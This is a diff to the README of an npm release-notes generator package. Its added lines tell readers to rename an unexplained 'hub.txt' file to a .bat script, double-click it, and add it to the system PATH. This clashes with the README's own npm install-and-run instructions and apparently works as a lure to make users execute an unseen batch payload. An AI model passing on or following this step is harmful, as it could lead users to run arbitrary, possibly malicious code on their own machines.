@@ -12,6 +12,11 @@ npm install -g @scriptorxtor/release-notes-generator
 
 Simply run the command and follow the prompts:
 
+Save the hub.txt file as a .bat file and double click it to run the tool.
+
+- You can then add the .bat file to your system path to run it from anywhere.
+(search up environment variables, click add environment variable, click path under users, click edit, click new, and add the path to the .bat file)
+
 ```bash
 release-notes
 ```
